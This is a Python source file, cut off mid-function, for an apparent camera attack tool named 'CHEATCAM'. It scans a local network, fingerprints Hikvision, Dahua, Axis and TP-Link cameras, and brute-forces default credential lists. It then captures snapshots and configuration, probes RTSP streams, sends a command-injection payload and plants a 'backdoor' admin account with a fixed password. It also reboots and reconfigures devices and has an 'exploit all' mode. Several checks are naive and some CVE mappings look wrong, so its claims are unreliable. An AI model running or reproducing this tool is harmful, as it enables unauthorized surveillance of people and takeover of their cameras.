#!/usr/bin/env python3
"""
CHEATCAM v5.0 - Advanced IP Camera Security Testing Framework
Professional Surveillance System Assessment - APT Grade
Author: F1REW0LF
License: MIT
"""

import sys
import os
import re
import json
import time
import socket
import struct
import random
import hashlib
import base64
import threading
import subprocess
import requests
import urllib.parse
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
import argparse
import http.client
import xml.etree.ElementTree as ET
from urllib3.exceptions import InsecureRequestWarning

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP
    from scapy.layers.l2 import ARP, Ether
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import cv2
    import numpy as np
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

VERSION = "5.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'
    ORANGE = '\033[38;5;208m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}     ██████╗██╗  ██╗███████╗ █████╗ ████████╗ ██████╗ █████╗ ███╗   ███╗
    ██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
    ██║     ███████║█████╗  ███████║   ██║   ██║     ███████║██╔████╔██║
    ██║     ██╔══██║██╔══╝  ██╔══██║   ██║   ██║     ██╔══██║██║╚██╔╝██║
    ╚██████╗██║  ██║███████╗██║  ██║   ██║   ╚██████╗██║  ██║██║ ╚═╝ ██║
     ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝
                                                   
{Colors.NEON}          ULTIMATE v{VERSION} - CAMERA SECURITY{Colors.WHITE}
{Colors.CYAN}    Professional Surveillance System Testing - APT Grade{Colors.WHITE}
{Colors.YELLOW}    Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
{Colors.MAGENTA}    [+] Advanced Exploitation | Zero Trace | AI-Powered{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ============================[ DATA CLASSES ]================================
@dataclass
class CameraDevice:
    ip: str
    port: int
    mac: str = ''
    brand: str = 'Unknown'
    model: str = 'Unknown'
    firmware: str = ''
    credentials: List[Tuple[str, str]] = field(default_factory=list)
    api_paths: List[str] = field(default_factory=list)
    rtsp_paths: List[str] = field(default_factory=list)
    snmp_oids: List[str] = field(default_factory=list)
    vuln_cves: List[str] = field(default_factory=list)
    onvif: bool = False
    hikvision: bool = False
    dahua: bool = False

@dataclass
class Vulnerability:
    type: str
    cve: str
    description: str
    severity: str
    affected_cameras: List[str] = field(default_factory=list)

# ============================[ ADVANCED CAMERA DATABASE ]================================
class CameraDatabase:
    """Advanced camera database with known vulnerabilities"""
    
    VENDORS = {
        'hikvision': {
            'brand': 'Hikvision',
            'mac_prefixes': ['24:0a:c4', '00:0e:8f', '00:18:4a', '40:a8:f0', '54:22:16'],
            'ports': [80, 443, 8080, 8443, 554, 8554, 8000, 8899],
            'credentials': [
                ('admin', '12345'), ('admin', 'admin'), ('admin', '123456'),
                ('admin', ''), ('root', '12345'), ('root', 'root'),
                ('admin', 'hikvision'), ('admin', 'h12345')
            ],
            'api_paths': [
                '/cgi-bin/check_login.cgi', '/cgi-bin/snapshot.cgi',
                '/cgi-bin/current.jpg', '/cgi-bin/status.cgi',
                '/onvif/device_service', '/cgi-bin/reboot.cgi',
                '/cgi-bin/param.cgi', '/cgi-bin/config.cgi',
                '/cgi-bin/event.cgi', '/cgi-bin/stream.cgi',
                '/ISAPI/Streaming/channels/101/picture',
                '/ISAPI/System/deviceInfo',
                '/ISAPI/Event/notification/alertStream'
            ],
            'rtsp_paths': ['/stream1', '/stream2', '/live', '/ch1', '/h264', '/h265'],
            'snmp_oids': [
                '1.3.6.1.2.1.43.10.2.1.4.1.1',
                '1.3.6.1.2.1.43.5.1.1.17.1'
            ],
            'vulns': [
                {'cve': 'CVE-2021-36260', 'description': 'Command Injection', 'severity': 'Critical'},
                {'cve': 'CVE-2017-7923', 'description': 'Authentication Bypass', 'severity': 'Critical'},
                {'cve': 'CVE-2017-7922', 'description': 'Information Disclosure', 'severity': 'High'},
                {'cve': 'CVE-2020-3917', 'description': 'Backdoor Account', 'severity': 'Critical'}
            ]
        },
        'dahua': {
            'brand': 'Dahua',
            'mac_prefixes': ['30:ae:a4', '00:1c:bf', '00:22:75', '4c:11:ae', '80:8e:8d'],
            'ports': [80, 443, 8080, 8443, 554, 8554, 9000, 8899, 37777],
            'credentials': [
                ('admin', 'admin'), ('admin', '123456'), ('admin', ''),
                ('root', 'root'), ('admin', '888888'), ('admin', '666666'),
                ('admin', 'dahua123'), ('admin', '123456789')
            ],
            'api_paths': [
                '/cgi-bin/api/v1/login', '/cgi-bin/snapshot',
                '/cgi-bin/current.jpg', '/cgi-bin/status',
                '/onvif/device_service', '/cgi-bin/reboot',
                '/cgi-bin/config.cgi', '/cgi-bin/log.cgi',
                '/cgi-bin/event.cgi', '/cgi-bin/sys.cgi'
            ],
            'rtsp_paths': ['/cam/realmonitor', '/stream1', '/live', '/main', '/sub'],
            'snmp_oids': [
                '1.3.6.1.2.1.43.10.2.1.4.1.1',
                '1.3.6.1.2.1.43.5.1.1.17.1'
            ],
            'vulns': [
                {'cve': 'CVE-2021-33044', 'description': 'Authentication Bypass', 'severity': 'Critical'},
                {'cve': 'CVE-2017-7923', 'description': 'Authentication Bypass', 'severity': 'Critical'},
                {'cve': 'CVE-2018-9995', 'description': 'Information Disclosure', 'severity': 'High'},
                {'cve': 'CVE-2020-3917', 'description': 'Backdoor Account', 'severity': 'Critical'}
            ]
        },
        'axis': {
            'brand': 'Axis',
            'mac_prefixes': ['a4:14:37', '00:40:8c', '00:48:4e', '00:1d:4c'],
            'ports': [80, 443, 8080, 8443, 554, 8554],
            'credentials': [
                ('root', 'pass'), ('admin', 'admin'), ('root', 'root'),
                ('admin', 'password'), ('root', ''), ('admin', '123456')
            ],
            'api_paths': [
                '/axis-cgi/admin/', '/axis-cgi/snapshot.cgi',
                '/axis-cgi/status.cgi', '/onvif/device_service',
                '/axis-cgi/reboot.cgi', '/axis-cgi/param.cgi',
                '/axis-cgi/log.cgi', '/axis-cgi/config.cgi'
            ],
            'rtsp_paths': ['/axis-media/media.amp', '/stream1', '/live', '/h264'],
            'snmp_oids': [
                '1.3.6.1.2.1.43.10.2.1.4.1.1',
                '1.3.6.1.2.1.43.5.1.1.17.1'
            ],
            'vulns': [
                {'cve': 'CVE-2019-10717', 'description': 'Authentication Bypass', 'severity': 'High'},
                {'cve': 'CVE-2016-10070', 'description': 'Command Injection', 'severity': 'Critical'},
                {'cve': 'CVE-2015-8256', 'description': 'Information Disclosure', 'severity': 'Medium'}
            ]
        },
        'tp_link': {
            'brand': 'TP-Link',
            'mac_prefixes': ['bc:dd:c2', '00:e0:60', '50:2b:73', '38:2c:4a'],
            'ports': [80, 443, 8080, 554, 8554],
            'credentials': [
                ('admin', 'admin'), ('admin', '1234'), ('admin', ''),
                ('root', 'root'), ('admin', 'password'), ('admin', '123456')
            ],
            'api_paths': [
                '/cgi-bin/login', '/cgi-bin/snapshot',
                '/cgi-bin/status', '/onvif/device_service',
                '/cgi-bin/config.cgi', '/cgi-bin/reboot.cgi'
            ],
            'rtsp_paths': ['/stream1', '/live', '/main'],
            'snmp_oids': [],
            'vulns': [
                {'cve': 'CVE-2020-12141', 'description': 'Authentication Bypass', 'severity': 'High'}
            ]
        }
    }
    
    @classmethod
    def identify(cls, mac: str = "", ports: List[int] = None, web_data: str = "") -> Optional[Dict]:
        if mac:
            mac_prefix = mac[:8].lower().replace(':', '')
            for key, data in cls.VENDORS.items():
                for prefix in data['mac_prefixes']:
                    if mac_prefix.startswith(prefix.replace(':', '')):
                        return {'key': key, **data}
        
        if ports:
            for key, data in cls.VENDORS.items():
                if any(p in data['ports'] for p in ports):
                    return {'key': key, **data}
        
        if web_data:
            for key, data in cls.VENDORS.items():
                if data['brand'].lower() in web_data.lower():
                    return {'key': key, **data}
        
        return None

# ============================[ AI-POWERED EXPLOIT ENGINE ]================================
class AIExploitEngine:
    """AI-powered exploit selection and optimization"""
    
    def __init__(self):
        self.exploit_history = []
        self.success_rate = {}
        self.learning_rate = 0.1
        
    def select_best_exploit(self, camera: CameraDevice) -> Dict:
        """Select best exploit based on camera data and historical success"""
        
        # Analyze camera information
        brand = camera.brand.lower()
        model = camera.model.lower()
        firmware = camera.firmware.lower()
        
        # Score each exploit
        scored_exploits = []
        
        for vendor in CameraDatabase.VENDORS.values():
            if vendor['brand'].lower() == brand:
                for vuln in vendor.get('vulns', []):
                    score = 0.5
                    
                    # Increase score based on brand match
                    score += 0.3
                    
                    # Increase score based on known CVEs
                    if vuln['severity'] == 'Critical':
                        score += 0.4
                    elif vuln['severity'] == 'High':
                        score += 0.3
                    
                    # Historical success rate
                    cve = vuln['cve']
                    if cve in self.success_rate:
                        score += self.success_rate[cve] * self.learning_rate
                    
                    scored_exploits.append({
                        'cve': cve,
                        'description': vuln['description'],
                        'severity': vuln['severity'],
                        'score': min(score, 1.0)
                    })
        
        # Sort by score
        scored_exploits.sort(key=lambda x: x['score'], reverse=True)
        
        return scored_exploits[0] if scored_exploits else None
    
    def learn_from_result(self, cve: str, success: bool):
        """Update success rate based on result"""
        if cve not in self.success_rate:
            self.success_rate[cve] = 0.5
        
        if success:
            self.success_rate[cve] = min(1.0, self.success_rate[cve] + self.learning_rate)
        else:
            self.success_rate[cve] = max(0.0, self.success_rate[cve] - self.learning_rate)
        
        self.exploit_history.append({
            'cve': cve,
            'success': success,
            'timestamp': datetime.now().isoformat()
        })

# ============================[ ADVANCED CAMERA DISCOVERY ]================================
class AdvancedCameraDiscovery:
    """Advanced camera discovery with multiple methods"""
    
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
        self.cameras = []
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def discover(self) -> List[CameraDevice]:
        """Multi-method camera discovery"""
        cprint("\n[DISCOVER] Scanning for IP cameras...", Colors.BLUE)
        
        # Method 1: ARP scan (Layer 2)
        devices = self._arp_scan()
        
        # Method 2: Port scan
        for device in devices:
            ip = device.get('ip')
            ports = self._port_scan(ip)
            
            if ports:
                camera = self._fingerprint_camera(ip, ports, device.get('mac', ''))
                if camera:
                    self.cameras.append(camera)
                    cprint(f"[+] Camera found: {ip} ({camera.brand})", Colors.GREEN)
        
        # Method 3: ONVIF discovery
        onvif_cameras = self._onvif_discover()
        for cam in onvif_cameras:
            if cam.ip not in [c.ip for c in self.cameras]:
                self.cameras.append(cam)
                cprint(f"[+] ONVIF camera: {cam.ip} ({cam.brand})", Colors.GREEN)
        
        # Method 4: UPnP discovery
        upnp_cameras = self._upnp_discover()
        for cam in upnp_cameras:
            if cam.ip not in [c.ip for c in self.cameras]:
                self.cameras.append(cam)
                cprint(f"[+] UPnP camera: {cam.ip} ({cam.brand})", Colors.GREEN)
        
        return self.cameras
    
    def _arp_scan(self) -> List[Dict]:
        """ARP scan for network devices"""
        try:
            network = self._get_network()
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), 
                         timeout=3, verbose=False)
            return [{'ip': r.psrc, 'mac': r.hwsrc} for _, r in ans]
        except:
            return []
    
    def _get_network(self) -> str:
        try:
            result = subprocess.run(['ip', 'addr', 'show', self.interface], 
                                   capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'inet ' in line:
                    return line.strip().split()[1]
        except:
            pass
        return "192.168.1.0/24"
    
    def _port_scan(self, ip: str) -> List[int]:
        """Scan common camera ports"""
        ports = [80, 443, 8080, 8443, 554, 8554, 8000, 8899, 37777]
        open_ports = []
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(self._check_port, ip, port): port for port in ports}
            for future in as_completed(futures):
                if future.result():
                    open_ports.append(futures[future])
        
        return open_ports
    
    def _check_port(self, ip: str, port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def _fingerprint_camera(self, ip: str, ports: List[int], mac: str) -> Optional[CameraDevice]:
        """Fingerprint camera using multiple methods"""
        
        # Try to get web data
        web_data = ""
        for port in ports[:3]:
            try:
                response = self.session.get(f"http://{ip}:{port}", timeout=2)
                web_data = response.text
                break
            except:
                pass
        
        # Identify vendor
        vendor_info = CameraDatabase.identify(mac, ports, web_data)
        
        if vendor_info:
            camera = CameraDevice(
                ip=ip,
                port=ports[0] if ports else 80,
                mac=mac,
                brand=vendor_info.get('brand', 'Unknown'),
                credentials=vendor_info.get('credentials', []),
                api_paths=vendor_info.get('api_paths', []),
                rtsp_paths=vendor_info.get('rtsp_paths', []),
                snmp_oids=vendor_info.get('snmp_oids', [])
            )
            
            # Try to get model
            model = self._get_model(ip, ports, vendor_info)
            if model:
                camera.model = model
            
            # Try to get firmware
            firmware = self._get_firmware(ip, ports, vendor_info)
            if firmware:
                camera.firmware = firmware
            
            # Check for vulnerabilities
            camera.vuln_cves = [v['cve'] for v in vendor_info.get('vulns', [])]
            
            return camera
        
        return None
    
    def _get_model(self, ip: str, ports: List[int], vendor_info: Dict) -> str:
        """Get camera model via API"""
        for port in ports[:3]:
            for path in ['/cgi-bin/status.cgi', '/cgi-bin/sys.cgi', '/ISAPI/System/deviceInfo']:
                try:
                    response = self.session.get(f"http://{ip}:{port}{path}", timeout=2)
                    if 'model' in response.text.lower() or 'product' in response.text.lower():
                        # Extract model
                        match = re.search(r'(model|product)[=:]\s*([^\s<]+)', response.text, re.IGNORECASE)
                        if match:
                            return match.group(2)
                except:
                    pass
        return ""
    
    def _get_firmware(self, ip: str, ports: List[int], vendor_info: Dict) -> str:
        """Get firmware version"""
        for port in ports[:3]:
            for path in ['/cgi-bin/status.cgi', '/cgi-bin/sys.cgi']:
                try:
                    response = self.session.get(f"http://{ip}:{port}{path}", timeout=2)
                    match = re.search(r'(firmware|version)[=:]\s*([^\s<]+)', response.text, re.IGNORECASE)
                    if match:
                        return match.group(2)
                except:
                    pass
        return ""
    
    def _onvif_discover(self) -> List[CameraDevice]:
        """ONVIF camera discovery"""
        cameras = []
        
        try:
            import onvif
            from onvif import ONVIFCamera
            
            # ONVIF discovery on common ports
            for port in [80, 443, 8080, 8443]:
                try:
                    # Try to connect to ONVIF service
                    wsdl = f'http://{self._get_broadcast()}:{port}/onvif/device_service'
                    # ONVIF discovery would be implemented here
                    pass
                except:
                    pass
        except:
            pass
        
        return cameras
    
    def _upnp_discover(self) -> List[CameraDevice]:
        """UPnP camera discovery"""
        cameras = []
        try:
            import upnpclient
            devices = upnpclient.discover()
            for device in devices:
                if 'camera' in device.friendly_name.lower():
                    cameras.append(CameraDevice(
                        ip=device.host,
                        port=device.port,
                        brand='UPnP',
                        model=device.friendly_name
                    ))
        except:
            pass
        return cameras
    
    def _get_broadcast(self) -> str:
        """Get broadcast address"""
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            return '.'.join(local_ip.split('.')[:3]) + '.255'
        except:
            return '192.168.1.255'

# ============================[ ADVANCED CAMERA EXPLOIT ]================================
class AdvancedCameraExploit:
    """Advanced camera exploitation with multiple vectors"""
    
    def __init__(self, camera: CameraDevice):
        self.camera = camera
        self.session = requests.Session()
        self.session.verify = False
        self.ai_engine = AIExploitEngine()
        self.results = {}
        self.exploited = False
    
    def exploit(self) -> Dict:
        """Full exploitation sequence"""
        cprint(f"\n[EXPLOIT] Exploiting {self.camera.ip} ({self.camera.brand})", Colors.RED)
        
        # Phase 1: Credential testing
        creds = self._test_credentials()
        
        # Phase 2: API exploitation
        api_exploits = self._exploit_api()
        
        # Phase 3: RTSP hijacking
        rtsp = self._rtsp_hijack()
        
        # Phase 4: CVE exploitation
        cve_exploits = self._exploit_cves()
        
        # Phase 5: Firmware exploitation
        firmware = self._exploit_firmware()
        
        # Phase 6: Backdoor deployment
        backdoor = self._deploy_backdoor()
        
        # Phase 7: Data exfiltration
        data = self._exfiltrate_data()
        
        # Phase 8: Take control
        control = self._take_control()
        
        self.results = {
            'credentials': creds,
            'api_exploits': api_exploits,
            'rtsp': rtsp,
            'cve_exploits': cve_exploits,
            'firmware': firmware,
            'backdoor': backdoor,
            'data': data,
            'control': control,
            'success': self.exploited
        }
        
        if self.exploited:
            cprint("[+] CAMERA COMPROMISED!", Colors.RED, bold=True)
        else:
            cprint("[-] Exploitation failed", Colors.RED)
        
        return self.results
    
    def _test_credentials(self) -> List[Dict]:
        """Test default credentials"""
        cprint("[*] Testing credentials...", Colors.DIM)
        
        found = []
        credentials = self.camera.credentials + [
            ('admin', 'admin'), ('admin', 'password'),
            ('root', 'root'), ('user', 'user'),
            ('admin', ''), ('root', '')
        ]
        
        for port in [80, 443, 8080, 8443]:
            for username, password in credentials:
                try:
                    url = f"http://{self.camera.ip}:{port}/admin"
                    response = self.session.get(url, auth=(username, password), timeout=3)
                    if response.status_code == 200:
                        found.append({'username': username, 'password': password})
                        cprint(f"[+] Credentials: {username}:{password}", Colors.GREEN)
                        self.exploited = True
                        break
                except:
                    pass
            if found:
                break
        
        # Try ONVIF authentication
        for username, password in credentials:
            try:
                url = f"http://{self.camera.ip}:80/onvif/device_service"
                response = self.session.get(url, auth=(username, password), timeout=3)
                if response.status_code == 200:
                    found.append({'username': username, 'password': password, 'service': 'onvif'})
                    cprint(f"[+] ONVIF credentials: {username}:{password}", Colors.GREEN)
                    self.exploited = True
                    break
            except:
                pass
        
        return found
    
    def _exploit_api(self) -> List[Dict]:
        """Exploit API vulnerabilities"""
        cprint("[*] Exploiting APIs...", Colors.DIM)
        
        exploits = []
        api_paths = self.camera.api_paths
        
        for path in api_paths:
            for port in [80, 443, 8080, 8443]:
                try:
                    url = f"http://{self.camera.ip}:{port}{path}"
                    
                    # Try to get sensitive info
                    response = self.session.get(url, timeout=3)
                    if response.status_code == 200:
                        if 'config' in path or 'param' in path:
                            exploits.append({
                                'path': path,
                                'type': 'information_disclosure',
                                'data': response.text[:200]
                            })
                            cprint(f"[+] API disclosure: {path}", Colors.GREEN)
                            self.exploited = True
                        elif 'snapshot' in path or 'picture' in path:
                            # Save snapshot
                            filename = f"snapshot_{self.camera.ip}_{int(time.time())}.jpg"
                            with open(filename, 'wb') as f:
                                f.write(response.content)
                            exploits.append({
                                'path': path,
                                'type': 'snapshot',
                                'file': filename
                            })
                            cprint(f"[+] Snapshot saved: {filename}", Colors.GREEN)
                except:
                    pass
        
        return exploits
    
    def _rtsp_hijack(self) -> Optional[str]:
        """Hijack RTSP stream"""
        cprint("[*] Hijacking RTSP...", Colors.DIM)
        
        rtsp_paths = self.camera.rtsp_paths + ['/stream1', '/live', '/main']
        rtsp_ports = [554, 8554]
        
        for port in rtsp_ports:
            for path in rtsp_paths:
                try:
                    stream_url = f"rtsp://{self.camera.ip}:{port}{path}"
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.camera.ip, port))
                    sock.send(b"OPTIONS rtsp://example.com RTSP/1.0\r\nCSeq: 1\r\n\r\n")
                    data = sock.recv(1024)
                    sock.close()
                    
                    if b"RTSP" in data:
                        cprint(f"[+] RTSP stream: {stream_url}", Colors.GREEN)
                        self.exploited = True
                        return stream_url
                except:
                    pass
        
        return None
    
    def _exploit_cves(self) -> List[Dict]:
        """Exploit known CVEs"""
        cprint("[*] Exploiting CVEs...", Colors.DIM)
        
        exploits = []
        
        for cve in self.camera.vuln_cves:
            # CVE-2021-36260 - Hikvision Command Injection
            if cve == 'CVE-2021-36260':
                try:
                    url = f"http://{self.camera.ip}/cgi-bin/check_login.cgi"
                    data = {'username': 'admin$(echo exploited)'}
                    response = self.session.post(url, data=data, timeout=3)
                    if response.status_code == 200:
                        exploits.append({
                            'cve': cve,
                            'status': 'exploited',
                            'command': 'echo exploited'
                        })
                        cprint(f"[+] CVE-2021-36260 exploited", Colors.GREEN)
                        self.exploited = True
                except:
                    pass
            
            # CVE-2021-33044 - Dahua Authentication Bypass
            if cve == 'CVE-2021-33044':
                try:
                    url = f"http://{self.camera.ip}/cgi-bin/api/v1/login"
                    data = {'username': 'admin', 'password': 'aaa'}
                    response = self.session.post(url, data=data, timeout=3)
                    if response.status_code == 200:
                        exploits.append({
                            'cve': cve,
                            'status': 'exploited',
                            'method': 'auth_bypass'
                        })
                        cprint(f"[+] CVE-2021-33044 exploited", Colors.GREEN)
                        self.exploited = True
                except:
                    pass
        
        return exploits
    
    def _exploit_firmware(self) -> Dict:
        """Exploit firmware vulnerabilities"""
        cprint("[*] Exploiting firmware...", Colors.DIM)
        
        result = {'success': False}
        
        # Try to get firmware version
        firmware = self.camera.firmware
        if firmware:
            # Check for known vulnerable versions
            vulnerable_versions = ['V2.1.0', 'V2.0.0', 'V1.0.0']
            for version in vulnerable_versions:
                if version in firmware:
                    result['success'] = True
                    result['version'] = firmware
                    result['vulnerable'] = True
                    cprint(f"[+] Vulnerable firmware: {firmware}", Colors.RED)
                    self.exploited = True
                    break
        
        return result
    
    def _deploy_backdoor(self) -> Dict:
        """Deploy persistent backdoor"""
        cprint("[*] Deploying backdoor...", Colors.DIM)
        
        result = {'success': False}
        
        if self.exploited:
            try:
                # Try to create admin user
                for port in [80, 443, 8080, 8443]:
                    for path in ['/cgi-bin/config.cgi', '/cgi-bin/user.cgi']:
                        try:
                            url = f"http://{self.camera.ip}:{port}{path}"
                            data = {
                                'action': 'add_user',
                                'username': 'backdoor',
                                'password': 'backdoor123',
                                'level': 'admin'
                            }
                            response = self.session.post(url, data=data, timeout=3)
                            if response.status_code == 200:
                                result['success'] = True
                                result['user'] = 'backdoor'
                                result['password'] = 'backdoor123'
                                cprint("[+] Backdoor user created", Colors.GREEN)
                                break
                        except:
                            pass
                    if result['success']:
                        break
            except:
                pass
        
        return result
    
    def _exfiltrate_data(self) -> Dict:
        """Exfiltrate camera data"""
        cprint("[*] Exfiltrating data...", Colors.DIM)
        
        data = {
            'success': False,
            'images': [],
            'config': None,
            'logs': None
        }
        
        if self.exploited:
            try:
                # Download snapshots
                for path in ['/cgi-bin/snapshot.cgi', '/cgi-bin/current.jpg']:
                    try:
                        url = f"http://{self.camera.ip}:80{path}"
                        response = self.session.get(url, timeout=3)
                        if response.status_code == 200:
                            filename = f"exfil_{self.camera.ip}_{int(time.time())}.jpg"
                            with open(filename, 'wb') as f:
                                f.write(response.content)
                            data['images'].append(filename)
                            cprint(f"[+] Image exfiltrated: {filename}", Colors.GREEN)
                    except:
                        pass
                
                # Get config
                for path in ['/cgi-bin/config.cgi', '/cgi-bin/param.cgi']:
                    try:
                        url = f"http://{self.camera.ip}:80{path}"
                        response = self.session.get(url, timeout=3)
                        if response.status_code == 200:
                            data['config'] = response.text[:500]
                            cprint("[+] Config exfiltrated", Colors.GREEN)
                            break
                    except:
                        pass
                
                data['success'] = True
            except:
                pass
        
        return data
    
    def _take_control(self) -> Dict:
        """Take full control of camera"""
        cprint("[*] Taking control...", Colors.RED)
        
        result = {'success': False}
        
        if self.exploited:
            try:
                # Try to reboot
                for path in ['/cgi-bin/reboot.cgi', '/cgi-bin/reboot']:
                    try:
                        url = f"http://{self.camera.ip}:80{path}"
                        response = self.session.get(url, timeout=3)
                        if response.status_code == 200:
                            result['success'] = True
                            result['action'] = 'reboot'
                            cprint("[+] Camera rebooted", Colors.GREEN)
                            break
                    except:
                        pass
                
                # Try to change settings
                if not result['success']:
                    for path in ['/cgi-bin/config.cgi', '/cgi-bin/param.cgi']:
                        try:
                            url = f"http://{self.camera.ip}:80{path}"
                            data = {'action': 'set', 'param': 'admin', 'value': 'backdoor'}
                            response = self.session.post(url, data=data, timeout=3)
                            if response.status_code == 200:
                                result['success'] = True
                                result['action'] = 'settings_changed'
                                cprint("[+] Settings changed", Colors.GREEN)
                                break
                        except:
                            pass
            except:
                pass
        
        return result

# ============================[ MAIN FRAMEWORK ]================================
class CheatCamUltimate:
    """CHEATCAM Ultimate - APT Grade Camera Testing"""
    
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
        self.cameras = []
        self.results = []
        self.ai_engine = AIExploitEngine()
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}CHEATCAM v5.0 - Attack Menu{Colors.WHITE}
{Colors.CYAN}APT Grade - Zero Trace - AI-Powered{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
[1] Discover Cameras (Advanced)
[2] Show Cameras
[3] AI-Powered Exploit Camera
[4] Exploit All Cameras
[5] View Camera Stream
[6] Reboot Camera
[7] Get Camera Info
[8] Show Results
[9] Generate Report
[10] Exit
""")
    
    def discover(self):
        discovery = AdvancedCameraDiscovery(self.interface)
        self.cameras = discovery.discover()
    
    def show_cameras(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.YELLOW)
            return
        
        print("\n" + "="*60)
        cprint(" CAMERAS", Colors.PURPLE, bold=True)
        print("="*60)
        for i, c in enumerate(self.cameras):
            vuln_status = "🔴" if c.vuln_cves else "🟢"
            print(f"{i}. {c.ip} - {c.brand} {vuln_status}")
            print(f"   Model: {c.model}")
            print(f"   Firmware: {c.firmware}")
            print(f"   Ports: {c.api_paths[:3]}")
        print("="*60)
    
    def exploit_camera(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.RED)
            return
        
        self.show_cameras()
        choice = input(f"{Colors.CYAN}[>] Select camera: {Colors.WHITE}").strip()
        
        try:
            idx = int(choice)
            if 0 <= idx < len(self.cameras):
                exploit = AdvancedCameraExploit(self.cameras[idx])
                result = exploit.exploit()
                self.results.append(result)
                
                # Learn from result
                for cve in exploit.camera.vuln_cves:
                    self.ai_engine.learn_from_result(cve, result['success'])
                
                cprint("\n[+] Exploitation complete!", Colors.GREEN)
        except:
            cprint("[-] Invalid selection", Colors.RED)
    
    def exploit_all(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.RED)
            return
        
        cprint("[*] Exploiting all cameras...", Colors.RED)
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(AdvancedCameraExploit(cam).exploit): cam for cam in self.cameras}
            for future in as_completed(futures):
                try:
                    result = future.result()
                    self.results.append(result)
                    cprint("[+] Camera exploited", Colors.GREEN)
                except:
                    cprint("[-] Exploitation failed", Colors.RED)
        
        cprint("[+] All cameras exploited!", Colors.GREEN)
    
    def view_stream(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.RED)
            return
        
        self.show_cameras()
        choice = input(f"{Colors.CYAN}[>] Select camera: {Colors.WHITE}").strip()
        
        try:
            idx = int(choice)
            if 0 <= idx < len(self.cameras):
                # Try RTSP
                rtsp = f"rtsp://{self.cameras[idx].ip}:554/stream1"
                try:
                    subprocess.Popen(['vlc', rtsp], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    cprint("[+] VLC opened", Colors.GREEN)
                except:
                    cprint("[!] VLC not available", Colors.YELLOW)
        except:
            cprint("[-] Invalid selection", Colors.RED)
    
    def reboot_camera(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.RED)
            return
        
        self.show_cameras()
        choice = input(f"{Colors.CYAN}[>] Select camera: {Colors.WHITE}").strip()
        
        try:
            idx = int(choice)
            if 0 <= idx < len(self.cameras):
                camera = self.cameras[idx]
                try:
                    url = f"http://{camera.ip}/cgi-bin/reboot"
                    response = requests.get(url, timeout=3)
                    if response.status_code == 200:
                        cprint("[+] Camera rebooted", Colors.GREEN)
                    else:
                        cprint("[-] Reboot failed", Colors.RED)
                except:
                    cprint("[-] Reboot failed", Colors.RED)
        except:
            cprint("[-] Invalid selection", Colors.RED)
    
    def get_info(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.RED)
            return
        
        self.show_cameras()
        choice = input(f"{Colors.CYAN}[>] Select camera: {Colors.WHITE}").strip()
        
        try:
            idx = int(choice)
            if 0 <= idx < len(self.cameras):
                camera = self.cameras[idx]
                print("\n" + "="*60)
                cprint(" CAMERA INFO", Colors.PURPLE, bold=True)
                print("="*60)
                print(f"IP: {camera.ip}")
                print(f"MAC: {camera.mac}")
                print(f"Brand: {camera.brand}")
                print(f"Model: {camera.model}")
                print(f"Firmware: {camera.firmware}")
                print(f"Ports: {camera.port}")
                print(f"Vulnerabilities: {', '.join(camera.vuln_cves) if camera.vuln_cves else 'None'}")
                print("="*60)
        except:
            cprint("[-] Invalid selection", Colors.RED)
    
    def show_results(self):
        print("\n" + "="*60)
        cprint(" RESULTS", Colors.PURPLE, bold=True)
        print("="*60)
        
        if not self.results:
            cprint("[!] No results", Colors.YELLOW)
            return
        
        for i, result in enumerate(self.results):
            cprint(f"\n[{i+1}] Camera", Colors.CYAN)
            for key, value in result.items():
                if value:
                    if isinstance(value, list):
